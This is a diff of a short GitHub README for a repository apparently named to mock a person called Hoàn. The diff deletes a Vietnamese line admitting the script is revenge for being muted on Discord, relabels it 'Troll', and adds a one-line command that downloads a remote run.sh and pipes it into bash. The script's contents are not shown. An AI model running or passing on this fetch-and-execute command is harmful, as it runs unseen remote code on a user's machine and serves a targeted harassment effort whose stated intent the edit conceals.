@@ -1,2 +1,7 @@
 # hoanhegay
-Thằng Hoàn nó mute t ở server discord nên t tiện làm script này để trả thù
+Troll
+
+## Run
+```bash
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/LT5B/hoanhegay/refs/heads/main/run.sh)"
+```
